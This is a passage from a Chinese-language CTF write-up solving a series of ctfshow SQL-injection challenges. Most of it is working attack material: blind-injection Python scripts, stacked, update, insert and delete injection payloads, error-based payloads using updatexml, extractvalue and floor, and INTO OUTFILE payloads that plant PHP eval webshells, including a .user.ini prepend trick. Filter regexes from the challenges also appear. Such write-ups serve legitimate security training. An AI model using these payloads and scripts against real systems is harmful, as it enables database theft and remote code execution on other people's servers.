42 result += chr(head) 43 else: 44 # 如果没有找到有效字符，退出循环 45 break 46 47 print(\u0026#34;[*]Result : \u0026#34;+result) 48 49# ctfshow{d317911f-ac1e-4160-be70-47d01a0f2f45} 乱码的话，多跑几次就好了\n另一种方法就是通过正则 DOS RLIKE注入\n利用 SQL 多次计算正则消耗计算资源产生延时效果，与 benchmark 原理类似，通过 rpad 或 repeat 构造长字符串，以计算量大的 pattern。\ndebug=1\u0026amp;ip=repeat(rpad(\u0026#39;a\u0026#39;, 999999, \u0026#39;a\u0026#39;),16) rlike concat(repeat(\u0026#39;(a.*)+\u0026#39;,14), \u0026#39;b\u0026#39;) web219 查询语句\rwhere id = ($id);\r返回逻辑\r//屏蔽危险分子\rfunction waf($str){\rreturn preg_match(\u0026#39;/sleep|benchmark|rlike/i\u0026#39;,$str);\r} 继续使用笛卡尔积盲注即可\n1import requests 2import time 3 4url = \u0026#34;http://61d55d79-847e-43d7-80e4-c221ceae9f4a.challenge.ctf.show/api/\u0026#34; 5result = \u0026#34;\u0026#34; 6i = 0 7 8while True: 9 i = i + 1 10 # ASCII码范围，32到127是可打印字符的范围 11 head = 32 12 tail = 127 13 14 while head \u0026lt; tail: 15 # 二分查找的中间值 16 mid = (head + tail) \u0026gt;\u0026gt; 1 17 18 # payload = \u0026#34;select table_name from information_schema.tables where table_schema=database() limit 0,1\u0026#34; 19 # payload = \u0026#34;select column_name from information_schema.columns where table_name=\u0026#39;ctfshow_flagxca\u0026#39; limit 1,1\u0026#34; 20 payload = \u0026#34;select flagaabc from ctfshow_flagxca\u0026#34; 21 22 data = { 23 \u0026#39;ip\u0026#39;: f\u0026#34;1) or if(ascii(substr(({payload}),{i},1))\u0026gt;{mid},(select count(*) from information_schema.columns A, information_schema.columns B),1)#\u0026#34;, 24 \u0026#39;debug\u0026#39;: \u0026#39;1\u0026#39; 25 } 26 try: 27 # 发送POST请求，设置超时时间为1秒 28 r = requests.post(url, data=data, timeout=0.15) 29 # 如果请求在1秒内返回，说明当前位置字符的ASCII码小于等于中间值 30 time.sleep(0.2) 31 tail = mid 32 except requests.exceptions.Timeout: 33 # 如果请求超时，说明当前位置字符的ASCII码大于中间值 34 time.sleep(0.2) 35 head = mid + 1 36 except Exception as e: 37 time.sleep(0.2) 38 print(f\u0026#34;An unexpected error occurred: {e}\u0026#34;) 39 break 40 41 if head != 32: 42 # 如果找到有效的字符，将其添加到结果字符串中 43 result += chr(head) 44 else: 45 # 如果没有找到有效字符，退出循环 46 break 47 48 print(\u0026#34;[*]Result : \u0026#34;+result) web220 查询语句\rwhere id = ($id);\r返回逻辑\r//屏蔽危险分子\rfunction waf($str){\rreturn preg_match(\u0026#39;/sleep|benchmark|rlike|ascii|hex|concat_ws|concat|mid|substr/i\u0026#39;,$str);\r} substr用left代替即可，有点像之前布尔盲注的一道题，只是改成了时间盲注罢了\n1import requests 2import string 3import time 4 5url = \u0026#34;http://52728b9a-ffae-4f96-b51f-0549bb5cb4e0.challenge.ctf.show/api/\u0026#34; 6str=\u0026#34; _{}-\u0026#34; + string.ascii_lowercase + string.digits 7result = \u0026#39;\u0026#39; 8for i in range(1,45): 9 for j in str: 10 # payload = \u0026#34;select table_name from information_schema.tables where table_schema=database() limit 0,1\u0026#34; 11 # payload = \u0026#34;select column_name from information_schema.columns where table_name=\u0026#39;ctfshow_flagxcac\u0026#39; limit 1,1\u0026#34; 12 payload = \u0026#34;select flagaabcc from ctfshow_flagxcac\u0026#34; 13 14 data = { 15 \u0026#39;ip\u0026#39;: f\u0026#34;1) or if(LEFT(({payload}),{i})regexp(\u0026#39;{result+j}\u0026#39;),(select count(*) from information_schema.columns A, information_schema.columns B),1)#\u0026#34;, 16 \u0026#39;debug\u0026#39;: 0 17 } 18 try: 19 r = requests.post(url, data=data, timeout=0.15) 20 time.sleep(0.2) 21 except Exception as e: 22 time.sleep(0.2) 23 result = result + j 24 print(\u0026#34;[*] loading :\u0026#34;+result) 25 break 26 27print(\u0026#34;[*] result :\u0026#34;+result) web221 1查询语句 2 3 //分页查询 4 $sql = select * from ctfshow_user limit ($page-1)*$limit,$limit; 5 6返回逻辑 7 8//TODO:很安全，不需要过滤 9//拿到数据库名字就算你赢 p神的文章有提到limit注入\n[转载]Mysql下Limit注入方法 | 离别歌\npayload:\n?page=1\u0026amp;limit=1%20procedure%20analyse(extractvalue(rand(),concat(0x3a,database())),1) group注入 web222 查询语句\r//分页查询\r$sql = select * from ctfshow_user group by $username;\r返回逻辑\r//TODO:很安全，不需要过滤 group by 可以进行时间盲注，布尔盲注等\n本来以为是报错注入的，发现好像不太行\n还是的时间盲注\n拿前面的盲注脚本改一改\n1import requests 2import time 3url = \u0026#34;http://529d9311-c036-4831-bfa1-b2ca91dae190.challenge.ctf.show/api/?u=\u0026#34; 4result = \u0026#34;\u0026#34; 5i = 0 6 7while True: 8 i = i + 1 9 # ASCII码范围，32到127是可打印字符的范围 10 head = 32 11 tail = 127 12 13 while head \u0026lt; tail: 14 # 二分查找的中间值 15 mid = (head + tail) \u0026gt;\u0026gt; 1 16 # 查表名 17 # payload = \u0026#34;select group_concat(table_name) from information_schema.tables where table_schema=database()\u0026#34; 18 # 查列名字 19 # payload = \u0026#34;select column_name from information_schema.columns where table_name=\u0026#39;ctfshow_flaga\u0026#39; limit 1,1\u0026#34; 20 # 爆字段 21 payload = \u0026#34;select flagaabc from ctfshow_flaga\u0026#34; 22 23 data = f\u0026#34;concat((if (ascii(substr(({payload}),{i},1))\u0026gt;{mid}, sleep(0.05), 2)), 1);\u0026#34; 24 25 try: 26 r = requests.post(url+data, timeout=0.05) 27 time.sleep(0.2) 28 tail = mid 29 except requests.exceptions.Timeout: 30 time.sleep(0.2) 31 # 如果请求超时，说明当前位置字符的ASCII码大于中间值 32 head = mid + 1 33 except Exception as e: 34 time.sleep(0.2) 35 print(f\u0026#34;An unexpected error occurred: {e}\u0026#34;) 36 break 37 38 if head != 32: 39 # 如果找到有效的字符，将其添加到结果字符串中 40 result += chr(head) 41 else: 42 # 如果没有找到有效字符，退出循环 43 break 44 print(\u0026#34;[*]Result : \u0026#34;+result) web223 1查询语句 2 3 //分页查询 4 $sql = select * from ctfshow_user group by $username; 5 6返回逻辑 7 8//TODO:很安全，不需要过滤 9//用户名不能是数字 这题ban掉了数字\n用true来构造出数字即可\n这题一开始我想用时间盲注的，但是跑不出来，后面直接拿y4✌的布尔盲注跑了\n如下\n1import requests 2import time 3url = \u0026#34;http://14dc1900-f046-44e8-bfa2-e93fbc2a32b3.challenge.ctf.show/api/?u=\u0026#34; 4result = \u0026#34;\u0026#34; 5i = 0 6 7def createNum(n): 8 num = \u0026#39;true\u0026#39; 9 if n == 1: 10 return \u0026#39;true\u0026#39; 11 else: 12 for i in range(n - 1): 13 num += \u0026#34;+true\u0026#34; 14 return num 15 16while True: 17 i = i + 1 18 # ASCII码范围，32到127是可打印字符的范围 19 head = 32 20 tail = 127 21 22 while head \u0026lt; tail: 23 # 二分查找的中间值 24 mid = (head + tail) \u0026gt;\u0026gt; 1 25 26 # 查数据库-ctfshow_flagas 27 # payload = \u0026#34;select group_concat(table_name) from information_schema.tables where table_schema=database()\u0026#34; 28 # 查字段-flagasabc 29 # payload = \u0026#34;select group_concat(column_name) from information_schema.columns where table_name=\u0026#39;ctfshow_flagas\u0026#39;\u0026#34; 30 # 查flag 31 payload = \u0026#34;select flagasabc from ctfshow_flagas\u0026#34; 32 33 34 params = { 35 # \u0026#34;u\u0026#34;: f\u0026#34;if(ascii(substr(({payload}),{createNum(i)},{createNum(1)}))\u0026gt;{createNum(mid)},sleep(true),true)\u0026#34; #时间盲注 （我没跑出来，不知道为啥 36 \u0026#34;u\u0026#34;: f\u0026#34;if(ascii(substr(({payload}),{createNum(i)},{createNum(1)}))\u0026gt;{createNum(mid)},username,\u0026#39;a\u0026#39;)\u0026#34; #布尔盲注 37 } 38 39 # try: 40 # r = requests.post(url,params=params,timeout=1) 41 # tail = mid 42 # except Exception as e: 43 # head = mid + 1 44 45 r = requests.get(url, params=params) 46 if \u0026#34;userAUTO\u0026#34; in r.text: 47 head = mid + 1 48 else: 49 tail = mid 50 51 if head != 32: 52 # 如果找到有效的字符，将其添加到结果字符串中 53 result += chr(head) 54 else: 55 # 如果没有找到有效字符，退出循环 56 break 57 58 print(result) 布尔盲注这么快，我为什么要想不开尝试时间盲注呢\nweb224 试了试万能密码，失败了\n访问/robots.txt\n发现有重置密码的路由\n修改密码之后登入，看到一个文件上传\nctfshow web224 sql_文件上传产生sql注入 详解_sql注入漏洞ctf文件上传-CSDN博客\n这是一道文件上传的sql注入题\n当文件上传时，后台会将文件名，文件路径，文件类型（文件头）直接与sql语句进行拼接\n所以我们可以构造一个恶意文件，将文件头改写成我们要拼接的sql语句，从而实现注入\n如图\npayload:\nC64File \u0026#34;\u0026#39;);select 0x3c3f3d60746163202f662a603f3e into outfile \u0026#39;/var/www/html/1.php\u0026#39;;--+ 新建文本，写入payload，改名为1.bin，上传文件，访问1.bin拿到flag\n堆叠注入 web225 没有过滤show\nusername=1\u0026#39;;show tables; 可以用handler读\npayload:\nusername=ctfshow\u0026#39;;show tables;handler ctfshow_flagasa open;handler ctfshow_flagasa read first; 1.handler ctfshow_flag as a open;\nHANDLER 语句是 MySQL 中用于直接操作表的一种特殊方式。此语句的作用是打开一个名为 ctfshow_flag 的表，并将其别名为 a。HANDLER 语句可以绕过一些常规的查询机制，直接访问表的数据，通常用于高效地获取数据。\n2.handler ctfshow_flag as a read first;\n该语句继续使用 HANDLER 来操作之前打开的 ctfshow_flag 表（别名 a），read first 表示读取表中的第一行数据。\n其他方法\nweb226 1查询语句 2 3 //分页查询 4 $sql = \u0026#34;select id,username,pass from ctfshow_user where username = \u0026#39;{$username}\u0026#39;;\u0026#34;; 5 6返回逻辑 7 8 //师傅说过滤的越多越好 9 if(preg_match(\u0026#39;/file|into|dump|union|select|update|delete|alter|drop|create|describe|set|show|\\(/i\u0026#39;,$username)){ 10 die(json_encode($ret)); 11 } 这道题把show给waf掉了\n这题可以用预处理来打\n[SQL注入][强网杯 2019]随便注(三种姿势)-CSDN博客\n格式\nPREPARE name from \u0026#39;[my sql sequece]\u0026#39;; //预定义SQL语句\rEXECUTE name; //执行预定义SQL语句\r(DEALLOCATE || DROP) PREPARE name; //删除预定义SQL语句 我们可以先将要执行的语句转换成16进制后，作为预处理的sql语句传入，并执行\npayload\nusername=1\u0026#39;;PREPARE tables from 0x73686f77207461626c6573;EXECUTE tables;\r//show tables\rusername=1\u0026#39;;PREPARE columns from 0x73656c6563742067726f75705f636f6e63617428636f6c756d6e5f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e636f6c756d6e73207768657265207461626c655f736368656d613d6461746162617365282920616e64207461626c655f6e616d653d2763746673685f6f775f666c6167617327;EXECUTE columns;\r//select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=\u0026#39;ctfsh_ow_flagas\u0026#39;\rusername=1\u0026#39;;PREPARE flag from 0x73656c65637420666c61676173622066726f6d2063746673685f6f775f666c61676173;EXECUTE flag;\r//select flagasb from ctfsh_ow_flagas\r//ctfshow{7d0038e7-cede-48cc-b0fb-307177d26890} web227 这道题没办法通过查表拿到flag\n这道题的payload是\n1\u0026#39;;call getFlag(); 就是执行getFlag函数拿到flag\n但问题是我们要怎么知道这个函数呢\n我们需要查看MySQL的存储过程，如下文\nMySQL——查看存储过程和函数_mysql 查询function-CSDN博客\nSELECT * FROM information_schema.Routines 通过预处理执行\nusername=1\u0026#39;;PREPARE Routines from 0x53454c454354202a2046524f4d20696e666f726d6174696f6e5f736368656d612e526f7574696e6573;EXECUTE Routines; 可以看到getFlag函数和flag\nweb228 查询语句\r//分页查询\r$sql = \u0026#34;select id,username,pass from ctfshow_user where username = \u0026#39;{$username}\u0026#39;;\u0026#34;;\r$bansql = \u0026#34;select char from banlist;\u0026#34;;\r返回逻辑\r//师傅说内容太多，就写入数据库保存\rif(count($banlist)\u0026gt;0){\rforeach ($banlist as $char) {\rif(preg_match(\u0026#34;/\u0026#34;.$char.\u0026#34;/i\u0026#34;, $username)){\rdie(json_encode($ret));\r}\r}\r} 同web226\nweb229 同web226\nweb230 同web226\nupdate注入 web231 查询语句\r//分页查询\r$sql = \u0026#34;update ctfshow_user set pass = \u0026#39;{$password}\u0026#39; where username = \u0026#39;{$username}\u0026#39;;\u0026#34;;\r返回逻辑\r//无过滤\r知道update函数的作用之后就好理解了\n可以通过update函数更新ctfshow_user表中的内容\n利用update将查询结果写入表中\npassword=1\u0026#39;,username=(select group_concat(table_name) from information_schema.tables where table_schema=database()) where 1=1#\u0026amp;username=1 查表名\rpassword=1\u0026#39;,username=(select group_concat(table_name) from information_schema.tables where table_schema=database()) where 1=1#\u0026amp;username=1\r查列名\rpassword=1\u0026#39;,username=(select group_concat(column_name) from information_schema.columns where table_name=\u0026#39;flaga\u0026#39;) where 1=1#\u0026amp;username=1\r得到flag\rpassword=1\u0026#39;,username=(select flagas from flaga) where 1=1#\u0026amp;username=1\r原文链接：https://blog.csdn.net/solitudi/article/details/110144623 web232 查询语句\r//分页查询\r$sql = \u0026#34;update ctfshow_user set pass = md5(\u0026#39;{$password}\u0026#39;) where username = \u0026#39;{$username}\u0026#39;;\u0026#34;;\r返回逻辑\r//无过滤 同web231\npassword=1\u0026#39;),username=(select group_concat(table_name) from information_schema.tables where table_schema=database()) where 1=1#\u0026amp;username=1\rpassword=1\u0026#39;),username=(select group_concat(column_name) from information_schema.columns where table_name=\u0026#39;flagaa\u0026#39;) where 1=1#\u0026amp;username=1\rpassword=1\u0026#39;),username=(select flagass from flagaa) where 1=1#\u0026amp;username=1 web233 查询语句\r//分页查询\r$sql = \u0026#34;update ctfshow_user set pass = \u0026#39;{$password}\u0026#39; where username = \u0026#39;{$username}\u0026#39;;\u0026#34;;\r返回逻辑\r//无过滤 这道题貌似waf掉了单引号，导致无法构造闭合，前面的方法用不了\n方法一 wp看到的骚操作\npayload\n#获取表名\rpassword=\\\u0026amp;username=,username=(select group_concat(table_name) from information_schema.tables where table_schema=database())%23\r#获取列名\rpassword=\\\u0026amp;username=,username=(select group_concat(column_name) from information_schema.columns where table_schema=database())%23\r#获取数据\rpassword=\\\u0026amp;username=,username=(select group_concat(flagass233) from flag233333) 方法二 ：盲注 1\u0026#34;\u0026#34;\u0026#34; 2Author:Y4tacker 3\u0026#34;\u0026#34;\u0026#34; 4import requests 5 6url = \u0026#34;http://4f5b7639-6d01-45c4-9610-e11239ba8c90.chall.ctf.show/api/?page=1\u0026amp;limit=10\u0026#34; 7 8result = \u0026#34;\u0026#34; 9i = 0 10 11while 1: 12 i = i + 1 13 head = 32 14 tail = 127 15 16 while head \u0026lt; tail: 17 mid = (head + tail) \u0026gt;\u0026gt; 1 18 # 查数据库 19 # payload = \u0026#34;select group_concat(table_name) from information_schema.tables where table_schema=database()\u0026#34; 20 # 查表名 21 # payload = \u0026#34;select column_name from information_schema.columns where table_name=\u0026#39;flag233333\u0026#39; limit 1,1\u0026#34; 22 # 查数据 23 payload = \u0026#34;select flagass233 from flag233333\u0026#34; 24 data = { 25 \u0026#39;username\u0026#39;: f\u0026#34;1\u0026#39; or if(ascii(substr(({payload}),{i},1))\u0026gt;{mid},sleep(0.05),1)#\u0026#34;, 26 \u0026#39;password\u0026#39;: \u0026#39;4\u0026#39; 27 } 28 try: 29 r = requests.post(url, data=data, timeout=0.9) 30 tail = mid 31 except Exception as e: 32 head = mid + 1 33 if head != 32: 34 result += chr(head) 35 else: 36 break 37 print(result) web234 查询语句\r//分页查询\r$sql = \u0026#34;update ctfshow_user set pass = \u0026#39;{$password}\u0026#39; where username = \u0026#39;{$username}\u0026#39;;\u0026#34;;\r返回逻辑\r//无过滤 同web233，用\\实现逃逸\nweb235 1查询语句 2 3 //分页查询 4 $sql = \u0026#34;update ctfshow_user set pass = \u0026#39;{$password}\u0026#39; where username = \u0026#39;{$username}\u0026#39;;\u0026#34;; 5 6返回逻辑 7 8 //过滤 or \u0026#39; or \u0026lsquo; 被禁导致information_schema.tables也被禁了\n导致我们没办法查询列\n这种情况涉及到一个知识点 ：CTF|mysql之无列名注入 - 知乎\n在 information_schema 中，除了 SCHEMATA、TABLES、COLUMNS 有表信息外，高版本的 mysql 中，还有 INNODB_TABLES 及 INNODB_COLUMNS 中记录着表结构。\n读表\nusername=,username=(select group_concat(table_name) from mysql.innodb_table_stats where database_name=database())#\u0026amp;password=\\ 查字段\nusername=,username=(select b from (select 1,2 as b,3 union select * from flag23a1 limit 1,1)a)#\u0026amp;password=\\ web236 1查询语句 2 3 //分页查询 4 $sql = \u0026#34;update ctfshow_user set pass = \u0026#39;{$password}\u0026#39; where username = \u0026#39;{$username}\u0026#39;;\u0026#34;; 5 6返回逻辑 7 8 //过滤 or \u0026#39; flag 读表\nusername=,username=(select group_concat(table_name) from mysql.innodb_table_stats where database_name=database())#\u0026amp;password=\\\r//banlist,ctfshow_user,flaga 读字段\nusername=,username=(select b from (select 1,2 as b,3 union select * from flaga limit 1,1)a)#\u0026amp;password=\\ 这题新增的flag过滤，但是实际上没有影响，或许是过滤返回的内容？\ninsert注入 web237 1查询语句 2 3 //插入数据 4 $sql = \u0026#34;insert into ctfshow_user(username,pass) value(\u0026#39;{$username}\u0026#39;,\u0026#39;{$password}\u0026#39;);\u0026#34;; 5 6返回逻辑 7 8 //无过滤 insert函数用于插入值\n其实跟update注入差不多\npayload:\n读表名\npassword=1\u0026amp;username=1\u0026#39;,(select group_concat(table_name) from information_schema.tables where table_schema=database()));# 查列名\npassword=1\u0026amp;username=1\u0026#39;,(select group_concat(column_name) from information_schema.columns where table_name=\u0026#39;flag\u0026#39;));#\r//id,flagass23s3,info 爆字段\npassword=1\u0026amp;username=1\u0026#39;,(select flagass23s3 from flag));# web238 1查询语句 2 3 //插入数据 4 $sql = \u0026#34;insert into ctfshow_user(username,pass) value(\u0026#39;{$username}\u0026#39;,\u0026#39;{$password}\u0026#39;);\u0026#34;; 5 6返回逻辑 7 8 //过滤空格 测了一下发现不止是空格，连同一些代替空格的字符也被一同waf了，比如/**/\n我们可以考虑用括号代替空格\npayload\n#获取表名\rusername=1\u0026#39;,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())))%23\u0026amp;password=1\r#获取列名\rusername=1\u0026#39;,(select(group_concat(column_name))from(information_schema.columns)where(table_name=\u0026#39;flagb\u0026#39;)))%23\u0026amp;password=1\r#获取数据\rusername=1\u0026#39;,(select(group_concat(flag))from(flagb)))%23\u0026amp;password=1 web239 查询语句\r//插入数据\r$sql = \u0026#34;insert into ctfshow_user(username,pass) value(\u0026#39;{$username}\u0026#39;,\u0026#39;{$password}\u0026#39;);\u0026#34;;\r返回逻辑\r//过滤空格 or payload:\n读表\nusername=1\u0026#39;,(select(group_concat(table_name))from(mysql.innodb_table_stats)where(database_name=database())))#\u0026amp;password=1 由于*被ban掉了，没办法用之前无列名爆字段的方法\n这里猜测列名为flag，直接读\nusername=1\u0026#39;,(select(flag)from(flagbb)))#\u0026amp;password=1 web240 Hint: 表名共9位，flag开头，后五位由a/b组成，如flagabaab，全小写 查询语句\r//插入数据\r$sql = \u0026#34;insert into ctfshow_user(username,pass) value(\u0026#39;{$username}\u0026#39;,\u0026#39;{$password}\u0026#39;);\u0026#34;;\r返回逻辑\r//过滤空格 or sys mysql 根据hint可以知道是要爆破表名\n拿y4✌的脚本改一下\n\u0026#34;\u0026#34;\u0026#34;\rAuthor:Y4tacker\r\u0026#34;\u0026#34;\u0026#34;\rimport random\rimport requests\rurl = \u0026#34;http://0a7a5c02-0a05-4efe-86f5-fcf36464cc74.challenge.ctf.show\u0026#34;\rurl_insert = url + \u0026#34;/api/insert.php\u0026#34;\rurl_flag = url + \u0026#34;/api/?page=1\u0026amp;limit=1000\u0026#34;\r# 看命函数\rdef generate_random_str():\rsttr = \u0026#39;ab\u0026#39;\rstr_list = [random.choice(sttr) for i in range(5)]\rrandom_str = \u0026#39;\u0026#39;.join(str_list)\rreturn random_str\rwhile 1:\rdata = {\r\u0026#39;username\u0026#39;: f\u0026#34;1\u0026#39;,(select(flag)from(flag{generate_random_str()})))#\u0026#34;,\r\u0026#39;password\u0026#39;: \u0026#34;\u0026#34;\r}\rr = requests.post(url_insert, data=data)\rr2 = requests.get(url_flag)\rif \u0026#34;ctfshow{\u0026#34; in r2.text:\rfor i in r2.json()[\u0026#39;data\u0026#39;]:\rif \u0026#34;ctfshow{\u0026#34; in i[\u0026#39;pass\u0026#39;]:\rprint(i[\u0026#39;pass\u0026#39;])\rbreak\rbreak web241 sql语句\r//删除记录\r$sql = \u0026#34;delete from ctfshow_user where id = {$id}\u0026#34;;\r返回逻辑\r//无过滤 delete注入，delete函数顾名思义就是从数据库中删除内容\n注入点在where后面，可以采用时间盲注或者布尔盲注，但是由于delete会删除数据库中的记录，所以可能会出现记录都删完了但是flag还没注出来的情况\n1import requests 2import time 3url = \u0026#39;http://40c66eef-72b4-4b08-88d0-87bef44b640e.challenge.ctf.show/api/delete.php\u0026#39; 4str = \u0026#39;\u0026#39; 5for i in range(1, 60): 6 min,max = 32, 128 7 while True: 8 j = min + (max-min)//2 9 if(min == j): 10 str += chr(j) 11 print(str) 12 break 13 # 爆表名 14 # payload = { 15 # \u0026#39;id\u0026#39;: f\u0026#39;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{i},1))\u0026lt;{j},sleep(0.03),1)#\u0026#39; 16 # } 17 # 爆列 18 # payload = { 19 # \u0026#39;id\u0026#39;: f\u0026#34;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=\u0026#39;flag\u0026#39;),{i},1))\u0026lt;{j},sleep(0.03),1)#\u0026#34; 20 # } 21 # 爆值 22 payload = { 23 \u0026#39;id\u0026#39;: f\u0026#34;if(ascii(substr((select group_concat(flag) from flag),{i},1))\u0026lt;{j},sleep(0.03),1)#\u0026#34; 24 } 25 start_time = time.time() 26 r = requests.post(url=url, data=payload).text 27 end_time = time.time() 28 sub = end_time - start_time 29 if sub \u0026gt;= 0.2: 30 max = j 31 else: 32 min = j 为什么sleep设定的是0.03，但是超时时间是大于0.2呢\n那是因为要对所有记录都算一遍 if\n那我们怎么测试这个时间呢，这里放一个大佬的脚本\nPractice - CTFSHOW WEB入门 SQL注入篇\nurl = \u0026#39;http://58e7b03f-3c20-48e0-a8f8-9a3efa102f6d.challenge.ctf.show:8080/api/delete.php\u0026#39;\rdef test2() -\u0026gt; float:\rrand = random.random()\rtime_s = time.time()\r_ = requests.post(url,data={\u0026#34;id\u0026#34;: f\u0026#34;if({1 if rand \u0026gt; 0.5 else 0},sleep(0.05),0)\u0026#34;})\rtime_e = time.time()\rreturn (rand \u0026gt; 0.5, time_e - time_s)\rprint([test() for _ in range(30)]) 我测出来的结果\n[(False, 0.09313225746154785), (True, 1.087439775466919), (True, 1.599609375), (True, 1.6065845489501953), (True, 1.6024441719055176), (False, 0.5998048782348633), (False, 0.0730128288269043), (True, 1.0801937580108643), (True, 1.6085357666015625), (False, 0.1298365592956543), (True, 1.089057445526123), (False, 0.6771323680877686), (True, 1.0864779949188232), (True, 1.6023609638214111), (False, 0.07814288139343262), (False, 0.07692098617553711), (False, 0.07593393325805664), (True, 1.082731008529663), (False, 0.07544946670532227), (True, 1.606881856918335), (True, 1.609898567199707), (False, 0.08498406410217285), (True, 1.0778491497039795), (True, 1.0797111988067627), (True, 1.0858359336853027), (False, 0.08560538291931152), (False, 0.08359408378601074), (False, 0.08201932907104492), (False, 0.07815837860107422), (True, 1.085575819015503)] 在false和true之间选取一个合适的值即可，目的是能够进行区分，我这里选取了0.2\n文件注入 web242 1sql语句 2 3 //备份表 4 $sql = \u0026#34;select * from ctfshow_user into outfile \u0026#39;/var/www/html/dump/{$filename}\u0026#39;;\u0026#34;; 5 6返回逻辑 7 8 //无过滤 outfile的语法\rSELECT ... INTO OUTFILE \u0026#39;file_name\u0026#39;\r[CHARACTER SET charset_name]\r[export_options]\rexport_options:\r[{FIELDS | COLUMNS}\r[TERMINATED BY \u0026#39;string\u0026#39;]//分隔符\r[[OPTIONALLY] ENCLOSED BY \u0026#39;char\u0026#39;]\r[ESCAPED BY \u0026#39;char\u0026#39;]\r]\r[LINES\r[STARTING BY \u0026#39;string\u0026#39;]\r[TERMINATED BY \u0026#39;string\u0026#39;]\r]\r----------------------------------------------------\r“OPTION”参数为可选参数选项，其可能的取值有：\rFIELDS TERMINATED BY \u0026#39;字符串\u0026#39;：设置字符串为字段之间的分隔符，可以为单个或多个字符。默认值是“\\t”。\rFIELDS ENCLOSED BY \u0026#39;字符\u0026#39;：设置字符来括住字段的值，只能为单个字符。默认情况下不使用任何符号。\rFIELDS OPTIONALLY ENCLOSED BY \u0026#39;字符\u0026#39;：设置字符来括住CHAR、VARCHAR和TEXT等字符型字段。默认情况下不使用任何符号。\rFIELDS ESCAPED BY \u0026#39;字符\u0026#39;：设置转义字符，只能为单个字符。默认值为“\\”。\rLINES STARTING BY \u0026#39;字符串\u0026#39;：设置每行数据开头的字符，可以为单个或多个字符。默认情况下不使用任何字符。\rLINES TERMINATED BY \u0026#39;字符串\u0026#39;：设置每行数据结尾的字符，可以为单个或多个字符。默认值是“\\n”。 漏洞的注入点是由于数据库的导出功能\n根据这个我们可以写入一句话木马\npayload:\nfilename=1.php\u0026#39; LINES STARTING BY \u0026#39;\u0026lt;?php eval($_POST[1]);?\u0026gt;\u0026#39;# web243 1sql语句 2 3 //备份表 4 $sql = \u0026#34;select * from ctfshow_user into outfile \u0026#39;/var/www/html/dump/{$filename}\u0026#39;;\u0026#34;; 5 6返回逻辑 7 8 //过滤了php 尝试一下.user.ini文件包含\nfilename=.user.ini\u0026#39; lines starting by \u0026#39;auto_prepend_file=1.txt\\n\u0026#39;%23\rfilename=1.txt\u0026#39; lines starting by \u0026#39;\u0026lt;?=eval($_POST[1])?\u0026gt;\u0026#39;%23 报错注入 新手小白入门——SQL注入之报错注入_sql注入报错注入-CSDN博客\nweb244 sql语句\r//备份表\r$sql = \u0026#34;select id,username,pass from ctfshow_user where id = \u0026#39;\u0026#34;.$id.\u0026#34;\u0026#39; limit 1;\u0026#34;;\r返回逻辑\r//无过滤 updatexml报错注入\npayload\n/api/?id=\u0026#39; or updatexml(1, concat(0x7e, database(), 0x7e), 1)%23\r/api/?id=\u0026#39; or updatexml(1, concat(0x7e, (select table_name from information_schema.tables where table_schema = database() limit 1, 1), 0x7e), 1)%23\r/api/?id=\u0026#39; or updatexml(1, concat(0x7e, (select column_name from information_schema.columns where table_schema = database() and table_name = \u0026#39;ctfshow_flag\u0026#39; limit 1, 1), 0x7e), 1)%23\r/api/?id=\u0026#39; or updatexml(1, concat(0x7e, (select column_name from information_schema.columns where table_schema = database() and table_name = \u0026#39;ctfshow_flag\u0026#39; limit 1, 1), 0x7e), 1)%23\r/api/?id=\u0026#39; or updatexml(1, concat(0x7e, (select substr(flag, 1, 30) from ctfshow_flag), 0x7e), 1)%23\r#ctfshow{89982b11-5c7d-4215-a78\r/api/?id=\u0026#39; or updatexml(1, concat(0x7e, (select substr(flag, 31, 30) from ctfshow_flag), 0x7e), 1)%23\r#9-a9f8ecc8f1b1}\r# 数据长度有限制，可以使用substr来截取\r//ctfshow{89982b11-5c7d-4215-a789-a9f8ecc8f1b1} web245 1sql语句 2 3 4 $sql = \u0026#34;select id,username,pass from ctfshow_user where id = \u0026#39;\u0026#34;.$id.\u0026#34;\u0026#39; limit 1;\u0026#34;; 5 6返回逻辑 7 8 //无过滤 9 过滤updatexml extractvalue报错注入\npayload\n查数据库名：id=\u0026#39; and (select extractvalue(1,concat(0x7e,(select database()))))%23\r爆表名：id=\u0026#39; and (select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))))%23\r//ctfshow_flagsa\r爆字段名：id=\u0026#39; and (select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=\u0026#34;ctfshow_flagsa\u0026#34;))))%23\r//flag1\r爆数据：\rid=\u0026#39; and (select extractvalue(1,concat(0x7e,(select substr(group_concat(flag1),1,30) from ctfshow_flagsa))))%23\rid=\u0026#39; and (select extractvalue(1,concat(0x7e,(select substr(group_concat(flag1),31,30) from ctfshow_flagsa))))%23\r//ctfshow{41446106-c47e-434d-a0c0-16ee43375249} web246 1sql语句 2 3 4 $sql = \u0026#34;select id,username,pass from ctfshow_user where id = \u0026#39;\u0026#34;.$id.\u0026#34;\u0026#39; limit 1;\u0026#34;; 5 6返回逻辑 7 8 //无过滤 9 过滤updatexml extractvalue floor报错注入\n原理：SQL注入报错注入之floor()报错注入原理分析_sql注入floor-CSDN博客\n#获取表名\r1\u0026#39; union select 1,count(*),concat(0x3a,0x3a,(select (table_name) from information_schema.tables where table_schema=database() limit 1,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a%23\r#获取列名\r1\u0026#39; union select 1,count(*),concat(0x3a,0x3a,(select (column_name) from information_schema.columns where table_name=\u0026#39;ctfshow_flags\u0026#39; limit 1,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a%23\r#获取数据\r1\u0026#39; union select 1,count(*),concat(0x3a,0x3a,(select (flag2) from ctfshow_flags limit 0,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a%23 web247 1sql语句 2 3 4 $sql = \u0026#34;select id,username,pass from ctfshow_user where id = \u0026#39;\u0026#34;.$id.\u0026#34;\u0026#39; limit 1;\u0026#34;; 5 6返回逻辑 7 8 //无过滤 9 过滤updatexml extractvalue floor 